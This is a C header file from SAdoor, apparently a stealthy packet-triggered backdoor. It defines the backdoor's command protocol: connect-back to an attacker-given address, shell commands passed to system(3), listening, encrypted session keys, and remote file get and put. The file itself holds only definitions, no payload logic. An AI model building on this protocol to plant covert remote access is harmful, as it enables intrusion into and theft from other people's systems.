/*
 *  File: command.h
 *  Description: SAdoor commands header file
 *  Version: 1.1
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Date: Sun Apr  6 18:49:40 CEST 2003
 *
 *  Copyright (c) 2002 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#ifndef _COMMAND_H
#define _COMMAND_H

#include <sys/types.h>

/*
 * Command data depends on the command code:
 *  
 *  SADOOR_CMD_CONNECT: [4 byte local IP][2 byte local port]
 *    This command contains the address that SAdoor should establish a
 *    TCP connection to.
 *
 *  SADOOR_CMD_RUN: [n bytes Shell command]
 *    Shell command to pass on to system(3).
 */

#ifndef PACKET_MAX_SIZE
#define PACKET_MAX_SIZE     1500
#endif 

struct sacmd {
    uint8_t iv[8];                 /* Initial vector */
    uint16_t length;               /* Total length including data */
    uint16_t code;                 /* Command code */
    uint8_t data[PACKET_MAX_SIZE]; /* Command data */
};

struct connect_cmd {
    uint32_t ip;
    uint16_t port;
};

struct accept_cmd {
    uint16_t lport;  /* Local port to listen on */
    uint32_t cip;    /* Client IP */
    uint16_t cport;  /* Client port */
};

/* Size of command header */
#define CMD_HDR_LEN             (sizeof(struct sacmd) - PACKET_MAX_SIZE)

/* Lengh of command data from an uint8_t array of proper size */
#define GET_DATA_LENGTH(x)   ((x) != NULL ? ((x)->length) - CMD_HDR_LEN : 0)

/* Total length, including header */
#define SET_DATA_LENGTH(x, len)    if ((x) != NULL) (x)->length = (len) + CMD_HDR_LEN

/*
 * Command packet codes 
 */
/* Connect back to given ip:port */
#define SADOOR_CMD_CONNECT        0x01

/* Run command */
#define SADOOR_CMD_RUN            0x02

/* Accept command */
#define SADOOR_CMD_ACCEPT        0x03

#define ISVALID_COMMANDCODE(code)	\
			(((code) == SADOOR_CMD_CONNECT) || \
			((code) == SADOOR_CMD_RUN) || \
			((code) == SADOOR_CMD_ACCEPT))

/*
 * Connection commands 
 */

/*
 * Makes SAdoor interpret the following
 * byte as a connection command.
 */
#define MAGIC_BYTES     "\xff\xff\xff\xff"
#define MAGIC_BYTES_LEN (sizeof(MAGIC_BYTES) -1)

struct wininfo {
    uint16_t height;
    uint16_t width;
    uint16_t xpix;
    uint16_t ypix;
};

/*
 * Connection codes
 */
/* Window information follows (struct wininfo) */
#define CONN_WINCHANGED     0x03
#define CONN_WINCHANGED_LEN (sizeof(MAGIC_BYTES)+sizeof(struct wininfo))

/* Session key */
#define CONN_SESSION_KEY    0x04

/*
 * Session key to use for the rest of the connection
 */
struct sesskey {
	uint8_t iv[8];      /* IV used to enrypt following fields */
	uint8_t code;       /* Contains CONN_SESSION_KEY */
	uint8_t enciv[8];	/* IV to use for encryption */
	uint8_t deciv[8];   /* IV to use for decryption */
	uint8_t key[56];    /* Key */
};

/* File transfer data */
#define CONN_FTDATA         0x05

/*
 * File transfer header
 */
struct ftcmd {
    uint8_t code;   /* Code, see below */
    uint32_t length; /* Length of data _after_ this header */
};

/* [code | length | remote-file NULL ] */
#define FT_GETFILE  0x01

/* [code | length | remote-file NULL ] */
#define FT_PUTFILE  0x02

/* SAdoor sends file back to be stored */
#define FT_STORE    0x03

/* SAdoor awaits file */
#define FT_READ     0x04

/* Read ACK from sash to sadoor when sending file */
#define FT_READ_ACK 0x05

/* [code | length | error-string NULL ] */
#define FT_ERROR    0x06
 

/* command .c */
extern int handle_command(uint8_t *, size_t, struct bfish_key *);
extern int connect_tcp(u_long, uint16_t);


#endif /* _COMMAND_H */
